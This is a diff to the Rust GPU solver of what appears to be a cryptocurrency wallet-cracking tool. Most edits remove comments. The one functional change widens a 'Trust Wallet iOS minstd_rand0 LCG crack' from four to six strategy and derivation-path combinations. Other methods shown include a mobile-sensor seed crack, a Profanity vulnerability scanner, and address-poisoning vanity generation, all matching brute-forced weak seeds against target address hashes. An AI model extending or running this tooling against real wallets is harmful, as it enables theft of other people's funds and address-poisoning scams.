@@ -339,19 +339,11 @@ impl GpuSolver {
     }
 
     /// Compute addresses using the optimized kernel with local memory
-    /// This provides 20-40% performance improvement over the standard batch_address kernel
-    /// by using local memory for SHA-256/SHA-512 operations during PBKDF2
-    ///
-    /// This method automatically calculates the optimal local work size based on
-    /// available local memory and falls back to the standard kernel if insufficient
     pub fn compute_batch_optimized(
         &self,
         entropies: &[[u8; 16]],
         purpose: u32,
     ) -> ocl::Result<Vec<[u8; 25]>> {
-        // Now that the standard batch_address kernel is highly optimized with
-        // PBKDF2 memoization and register pressure reduction, the previous 
-        // "local memory" variant is redundant and actually slower on Apple Silicon.
         self.compute_batch(entropies, purpose)
     }
 
@@ -367,15 +359,10 @@ impl GpuSolver {
             return Ok(Vec::new());
         }
 
-        // Split 128-bit entropy into two 64-bit ulongs for OpenCL
-        // GPU reconstructs bytes in big-endian order, so we must send as big-endian
         let mut entropies_hi = Vec::with_capacity(batch_size);
         let mut entropies_lo = Vec::with_capacity(batch_size);
 
         for ent in entropies {
-            // CRITICAL: The OpenCL kernel expects big-endian byte order
-            // The kernel unpacks bytes[0..8] from hi and bytes[8..16] from lo
-            // See batch_address.cl lines 20-37 for how bytes are extracted
             let hi = u64::from_be_bytes(
                 ent[0..8]
                     .try_into()
@@ -390,7 +377,6 @@ impl GpuSolver {
             entropies_lo.push(lo);
         }
 
-        // Use pinned/alloc_host_ptr for faster CPU-GPU transfers
         let buffer_hi = Buffer::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
@@ -412,10 +398,7 @@ impl GpuSolver {
             .len(output_len)
             .build()?;
 
-        // Calculate optimal local work size
         let local_work_size = self.calculate_local_work_size(batch_size);
-        
-        // CRITICAL: Global work size MUST be a multiple of local work size
         let global_work_size = batch_size.div_ceil(local_work_size) * local_work_size;
 
         let kernel = self
@@ -450,12 +433,11 @@ impl GpuSolver {
     pub fn compute_cake_hash(
         &self,
         timestamps: &[u64],
-        target_hashes: &[u8], // Flattened sorted hashes
+        target_hashes: &[u8],
     ) -> ocl::Result<Vec<u64>> {
         let batch_size = timestamps.len();
         let target_count = target_hashes.len() / 32;
 
-        // Use pinned memory for faster transfers
         let buffer_timestamps = Buffer::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
@@ -463,7 +445,6 @@ impl GpuSolver {
             .copy_host_slice(timestamps)
             .build()?;
 
-        // Input buffer: target hashes (read-only, can be cached)
         let buffer_hashes = Buffer::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
@@ -471,8 +452,6 @@ impl GpuSolver {
             .copy_host_slice(target_hashes)
             .build()?;
 
-        // Output buffer: results (timestamps)
-        // Max 1024 results per batch (unlikely to find many)
         let max_results = 1024;
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
@@ -480,7 +459,6 @@ impl GpuSolver {
             .len(max_results)
             .build()?;
 
-        // Output buffer: result count
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(
@@ -493,7 +471,6 @@ impl GpuSolver {
             .copy_host_slice(&[0u32])
             .build()?;
 
-        // Calculate optimal local work size
         let local_work_size = self.calculate_local_work_size(batch_size);
 
         let kernel = self
@@ -504,7 +481,6 @@ impl GpuSolver {
 			.arg(target_count as u32)
 			.arg(&buffer_results)
 			.arg(&buffer_count)
-			// 👇 ДОБАВЛЯЕМ local memory
 			.arg_local::<u64>(24)
 			.global_work_size(batch_size)
 			.local_work_size(local_work_size)
@@ -514,7 +490,6 @@ impl GpuSolver {
             kernel.enq()?;
         }
 
-        // Read count
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
@@ -523,16 +498,12 @@ impl GpuSolver {
             let read_count = std::cmp::min(count, max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
-
-            // Return only valid results
             Ok(results[0..read_count].to_vec())
         } else {
             Ok(Vec::new())
         }
     }
 
-    /// Compute SHA-256 hashes for simulated mobile-sensor seeds.
-    /// Returns a vector of 32-byte hashes, one per index.
     pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
         let count = indices.len();
         if count == 0 {
@@ -581,7 +552,6 @@ impl GpuSolver {
         Ok(hashes)
     }
 
-    /// Compute Address Poisoning (Vanity Address Generation)
     pub fn compute_address_poisoning(
         &self,
         seed_base: u64,
@@ -644,7 +614,6 @@ impl GpuSolver {
         }
     }
 
-    /// Compute Mobile Sensor Crack
     pub fn compute_mobile_crack(&self, target_h160: &[u8; 20]) -> ocl::Result<Vec<u64>> {
         let mut h1 = 0u64;
         let mut h2 = 0u64;
@@ -715,7 +684,6 @@ impl GpuSolver {
         }
     }
 
-    /// Profanity Vulnerability Scanner
     pub fn compute_profanity(
         &self,
         total_seeds: u64,
@@ -900,15 +868,17 @@ impl GpuSolver {
 
     /// Trust Wallet iOS — minstd_rand0 (LCG) crack
     ///
-    /// Scans `[start_timestamp, end_timestamp)` checking all 4 combinations of:
-    ///   strategy ∈ { BytePerCall, WordPerCall }
-    ///   path     ∈ { m/44'/0'/0'/0/0 (P2PKH), m/84'/0'/0'/0/0 (P2WPKH) }
+    /// Scans `[start_timestamp, end_timestamp)` checking all 6 combinations of:
+    ///   strategy ∈ { BytePerCallAnd, BytePerCallMod }
+    ///   path     ∈ { m/44'/0'/0'/0/0 (P2PKH), m/84'/0'/0'/0/0 (P2WPKH), m/49'/0'/0'/0/0 (P2SH-P2WPKH) }
     ///
     /// Returns `Vec<(timestamp, combo)>` where combo encodes (strategy, path):
-    ///   combo 0 → BytePerCall + P2PKH
-    ///   combo 1 → WordPerCall + P2PKH
-    ///   combo 2 → BytePerCall + P2WPKH
-    ///   combo 3 → WordPerCall + P2WPKH
+    ///   combo 0 → BytePerCallAnd + P2PKH
+    ///   combo 1 → BytePerCallMod + P2PKH
+    ///   combo 2 → BytePerCallAnd + P2WPKH
+    ///   combo 3 → BytePerCallMod + P2WPKH
+    ///   combo 4 → BytePerCallAnd + P2SH-P2WPKH
+    ///   combo 5 → BytePerCallMod + P2SH-P2WPKH
     pub fn compute_trust_wallet_lcg_crack(
         &self,
         start_timestamp: u32,
@@ -939,14 +909,14 @@ impl GpuSolver {
         for (i, &b) in target_h160.iter().skip(8).enumerate().take(8) { h2 |= (b as u64) << (i * 8); }
         for (i, &b) in target_h160.iter().skip(16).enumerate().take(4){ h3 |= (b as u32) << (i * 8); }
 
-        // Global work size: 4 items per timestamp (one per combo)
+        // Global work size: 6 items per timestamp (one per combo)
         let range      = (end_timestamp - start_timestamp) as usize;
-        let raw_global = range * 4;
+        let raw_global = range * 6;
         let local      = self.max_work_group_size.min(256);
         let global     = raw_global.div_ceil(local) * local;
 
         info!(
-            "[GPU:LCG] Scanning {} timestamps × 4 combos → {} work items (local={})",
+            "[GPU:LCG] Scanning {} timestamps × 6 combos → {} work items (local={})",
             range, raw_global, local
         );
 
@@ -1381,7 +1351,6 @@ impl GpuSolver {
         }
     }
 
-    /// Test MT19937 implementation against known test vectors
     pub fn test_mt19937(&self, seeds: &[u32]) -> ocl::Result<Vec<[u8; 16]>> {
         let count = seeds.len();
 
@@ -1427,7 +1396,6 @@ impl GpuSolver {
         Ok(results)
     }
 
-    /// Get GPU device information
     pub fn device_info(&self) -> ocl::Result<String> {
         let device = self.pro_que.device();
         let name    = device.name()?;
